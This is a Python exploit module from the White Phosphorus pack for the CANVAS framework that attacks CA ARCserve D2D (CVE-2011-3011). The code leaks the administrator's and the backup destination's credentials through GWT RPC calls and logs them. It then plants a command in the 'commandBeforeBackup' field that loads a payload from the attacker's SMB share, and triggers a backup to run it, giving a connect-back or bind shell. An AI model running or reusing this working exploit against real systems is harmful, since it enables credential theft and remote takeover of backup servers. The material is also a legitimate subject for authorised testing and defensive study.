
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
from MOSDEF import mosdef 
from MOSDEF import pelib
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer
from libs.canvasos import canvasos
import libs.spkproxy as spkproxy


######################################################################################
NAME = "CA ARCserve D2D GWT RPC Remote Code Execution"
DESCRIPTION = "Exploits a credential disclosure leading to remote code execution in CA ARCserve D2D"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='CA'
DOCUMENTATION["Date public"] = "2011-07-25"
DOCUMENTATION["Repeatability"] = "Unlimited"
DOCUMENTATION['CVE Name']="CVE-2011-3011"
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=2011-3011'
DOCUMENTATION['CVSS'] = 5.0
DOCUMENTATION["References"] = """
http://osvdb.org/74162
http://retrogod.altervista.org/9sg_ca_d2dii.html"""
DOCUMENTATION["Notes"] = """
This module exploits an Administrator Credential disclosure vulnerability which leads to remote code execution on CA ARCserve D2D.

The credential disclosure vulnerability requires the Administrator has logged in to D2D at least once per Tomcat instance.

All payloads are served over SMB via wp_smbserver_backdoor except 'Execute Command' which does not require it. Windows based CANVAS users must first disable the native Windows SMB server before running the module. On Windows 7 this is done by disabling the 'Server' and 'TCP/IP NetBIOS Helper' services and rebooting the system.

Dropped payloads must be removed manually from c:\windows\system32\.

Instructions:
1. Disable native SMB server and reboot
2. Run wp_ca_arcserve_d2d
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2003", "XP", "Vista", "7"]

NOTES="""
This module exploits an Administrator Credential disclosure vulnerability which leads to remote code execution on CA ARCserve D2D.

The credential disclosure vulnerability requires the Administrator has logged in to D2D at least once per Tomcat instance.

All payloads are served over SMB via wp_smbserver_backdoor except 'Execute Command' which does not require it. Windows based CANVAS users must first disable the native Windows SMB server before running the module. On Windows 7 this is done by disabling the 'Server' and 'TCP/IP NetBIOS Helper' services and rebooting the system.

Dropped payloads must be removed manually from c:\windows\system32\.

Instructions:
1. Disable native SMB server and reboot
2. Run wp_ca_arcserve_d2d

-------------------------------------------------
WP> White Phosphorus Exploit Pack
WP> CA ARCserve D2D GWT RPC Remote Code Execution
-------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Windows Universal

Payloads:
0: TCP Connect Back
1: IE Inject Connect Back
2: HTTPMOSDEF SSL
3: HTTPMOSDEF PLAIN
4: Bind MOSDEF Shell
5: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_ca_arcserve_d2d_gwt/wp_ca_arcserve_d2d_gwt.py  -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 8014
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows Universal", (0x00000000), [WINALL]]
}

class theexploit(wp_exploit):
            ######################################################################################
            ## WP> Dialog Information
            ##########################s###########################################################
    PAYLOADS=["TCP Connect Back",
              "IE Inject Connect Back",
              "HTTPMOSDEF SSL",
              "HTTPMOSDEF PLAIN",
              "Bind MOSDEF Shell",
              "Execute Command"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.version = 0
        self.badstring = "\x00\x0a\x0d"
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.DCLauncherURL = ''
        self.autoVersioned = False
        self.use_universal = True
        self.payloadFilename = "".join( [ random.choice(string.lowercase) for x in range(8) ] ) + '.exe'
        self.sharefilename = "\\\\"+ "".join( [ random.choice(string.lowercase) for x in range(4) ] ) + "\\\\" + self.payloadFilename
        self.vProtect = True
        self.useRawShellcode = True
        self.jsessionid = ''
        self.destDir = ''
        self.destUser = ''
        self.destPasswd = ''
        self.d2dAdminUser = ''
        self.d2dAdminPasswd = ''
        self.ExecCmd = False
        return

    def usage(self):
        self.wp_usage(targets)
        return  
    
    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        ret = 0
        useragentstring = 'http://'+self.host+':%s'%self.port+'/'
        UA = spkproxy.UserAgent(useragentstring, auth=None, hostname=self.host, exploit=self)
        UA.addHeader('Content-Type','text/x-gwt-rpc; charset=utf-8')
        UA.SetCookie('donotshowgettingstarted', '%7B%22state%22%3Atrue%7D')
        stage1 = self.makestage1()      
        reply = UA.POST('/contents/service/homepage', stage1, noresponse=False)
        if ('OK' and 'user' and 'password') in reply:
            ret = 1
        return ret

    def neededListenerTypes(self):
        self.getArgs()
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    

    def getArgs(self):
        # Selected shell options
        self.wp_getShellcodeType()

        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return
    
    def makestage1(self):
        stage1 = '5|0|4|http://%s:%d/contents/|2C6B33BED38F825C48AE73C093241510|com.ca.arcflash.ui.client.homepage.HomepageService|getLocalHost|1|2|3|4|0|'%(self.host,self.port)
        return stage1
    
    def makestage2(self):
        stage2 = '5|0|10|http://%s:%d/contents/|1414F6D5BFCC88417733B593C07B11FD|com.ca.arcflash.ui.client.login.LoginService|validateUser|java.lang.String|I|'%(self.host,self.port)
        stage2 += 'http:|%s|%s|%s|1|2|3|4|6|5|5|6|5|5|5|7|8|8014|0|9|10|'%(self.host,self.d2dAdminUser,self.d2dAdminPasswd)
        return stage2
    
    def makestage3(self):
        stage3 = '5|0|4|http://%s:%d/contents/|1414F6D5BFCC88417733B593C07B11FD|com.ca.arcflash.ui.client.login.LoginService|getBackupConfiguration|1|2|3|4|0|'%(self.host,self.port)
        return stage3
    
    def makestage4(self):
        if self.ExecCmd:
            payload = self.execCMD
        else:
            self.log("WP> Filename: %s"%self.payloadFilename)
            payload = "\\\\\\\\" + self.callback.ip + self.sharefilename
        
        post = 'POST /contents/service/login HTTP/1.1\r\n'
        stage4 = '5|0|74|http://192.168.4.12:8014/contents/|1414F6D5BFCC88417733B593C07B11FD|com.ca.arcflash.ui.client.login.LoginService|saveBackupConfiguration|'
        stage4 += 'com.ca.arcflash.ui.client.model.BackupSettingsModel|com.ca.arcflash.ui.client.model.BackupSettingsModel/2873179750|java.util.ArrayList/3821976829|'
        stage4 +='com.ca.arcflash.ui.client.model.BackupVolumeModel/2354341004|com.extjs.gxt.ui.client.data.RpcMap/3441186752|isFullMachine|java.lang.Boolean/476441737|'
        stage4 +='com.ca.arcflash.ui.client.model.BackupScheduleModel/3849507160|enabled|interval|java.lang.Integer/3438268394|intervalUnit|AdminUserName|'
        stage4 +='java.lang.String/2004016611|%s|destUserName|%s|enableProxyAuth|mailUser|subject|proxyAddress|actionsUserName|administrator|commandAfterSnapshot||'%(self.d2dAdminUser,self.destUser)
        stage4 +='enableEncryption|BackupStartTime|java.lang.Long/4227064769|destPassword|%s|AdminPassword|%s|preExitCode|spaceMeasureNum|java.lang.Double/858496421|'%(self.destPasswd,self.d2dAdminPasswd)
        stage4 +='actionsPassword|enableProxy|purgeSQLLogDays|enableEmail|proxyPassword|smtpPort|enableSpaceNotification|proxyUsername|MailServiceName|commandAfterBackup|enableSsl|'
        stage4 +='enableEmailOnMissedJob|ChangedBackupDestType|compressionLevel|purgeExchangeLogDays|MailPassword|proxyPort|enableMailAuth|spaceSavedAfterCompression|destination|%s|'%self.destDir
        stage4 +='enableTls|content|SMTP|retentionCount|ChangedBackupDest|skipJob|enablePreExitCode|fromAddress|growthRate|enableEmailOnSuccess|enableHTMLFormat|'
        stage4 +='commandBeforeBackup|%s|'%payload
        stage4 +='spaceMeasureUnit|1|2|3|4|1|5|6|7|0|8|0|1|9|1|10|11|1|12|1|9|1|13|11|0|12|1|9|3|13|-5|14|15|30|16|15|2|12|1|9|1|13|-8|0|1|9|47|17|18|19|20|18|21|22|-8|23|0|24|0|25|'
        stage4 +='0|26|18|27|28|18|29|30|-8|31|32|585347424|1314259992576|33|18|34|35|18|36|37|15|0|38|39|0|40|-22|41|-8|42|32|0|0|43|-8|44|0|45|-23|46|-8|47|0|48|0|49|-19|50|-8|51|'
        stage4 +='-8|52|15|0|53|15|1|54|-25|55|0|56|-23|57|-8|58|15|10|59|18|60|61|-8|62|0|63|0|64|15|31|65|-8|66|-8|67|-8|68|0|69|-28|70|-8|71|-8|72|18|73|74|0|\r\n'
        return stage4
    
    def makestage5(self):
        stage5 = '5|0|7|http://%s:%d//contents/|3479CB94E438D0158FB07486BED2B6B7|com.ca.arcflash.ui.client.common.CommonService|backup|I|'%(self.host,self.port)
        stage5 += 'java.lang.String|Customized Verify Backup|1|2|3|4|2|5|6|2|7|'
        return stage5

    def run(self):
        self.getArgs()
        self.result_error = 0
        
        try:
            if self.shell_EXECCMD:
                self.ExecCmd = True
        except:
            self.ExecCmd = False
        
        if not self.ExecCmd:
            self.log("WP> Starting wp_smbserver_backdoor and serve Payload")
            try:
                app=self.engine.getModuleExploit("wp_smbserver_backdoor")
                app.link(self) # set arguments to modules arguments
                app.argsDict['sharefilename'] = self.sharefilename
                app.argsDict['trojanPayload'] = self.shellcode
                ret=app.run()
            except:
                self.log("WP> Unable to start wp_smbserver_backdoor - port 443 already bound?")
                self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
                return None,None        
            time.sleep(5)

        useragentstring = 'http://'+self.host+':%s'%self.port+'/'
        UA = spkproxy.UserAgent(useragentstring, auth=None, hostname=self.host, exploit=self)
        UA.addHeader('Content-Type','text/x-gwt-rpc; charset=utf-8')
        UA.SetCookie('donotshowgettingstarted', '%7B%22state%22%3Atrue%7D')
        
        stage1 = self.makestage1()
        self.log("WP> Retrieving Administrator Credentials")
        reply = UA.POST('/contents/service/homepage', stage1, noresponse=False)
        if ('OK' and 'user' and 'password') in reply:
            reply = reply.split('","')
            
            for i in range(len(reply)):
                if 'user' in reply[i]: self.d2dAdminUser = reply[i+1]
                if 'password' in reply[i]: self.d2dAdminPasswd = reply[i+1]
            
            self.log("WP> D2D Admin Username: %s"%self.d2dAdminUser)
            self.log("WP> D2D Admin Password: %s"%self.d2dAdminPasswd)
        else:
            self.log("WP> Invalid response from D2D - (Administrator must log in once each tomcat session to enable vulnerable condition!)")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0
        
        stage2 = self.makestage2()
        self.log("WP> Logging In To Server")
        reply = UA.POST('/contents/service/login', stage2, noresponse=False)        
        if 'OK' not in reply:
            self.log("WP> Invalid response from D2D - administrator credentials failed!")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0
        
        stage3 = self.makestage3()
        self.log("WP> Retrieving Current Backup Configuration")
        reply = UA.POST('/contents/service/login', stage3, noresponse=False)
        if ('OK' and 'destUserName' and 'destPassword' and 'destination') in reply:
            reply = reply.split('","')
            
            for i in range(len(reply)):
                if 'destUserName' in reply[i]: self.destUser = reply[i+1]
                if 'destPassword' in reply[i]: self.destPasswd = reply[i+1]
                if 'destination' in reply[i]: self.destDir = reply[i+1]
            
            self.log("WP> Destination Username: %s"%self.destUser)
            self.log("WP> Destination Password: %s"%self.destPasswd)
            self.log("WP> Destination Directory: %s"%self.destDir.decode('string_escape'))
        else:
            self.log("WP> Invalid response from D2D - Required paramaters missing!")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0
        time.sleep(3)
        
        self.log("WP> Sending Exploit")
        stage4 = self.makestage4()
        reply = UA.POST('/contents/service/login', stage4, noresponse=False)
        time.sleep(3)

        stage5 = self.makestage5()
        reply = UA.POST('/contents/service/common', stage5, noresponse=False)
        time.sleep(10)

        ret=self.ISucceeded()
        self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
        return ret

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
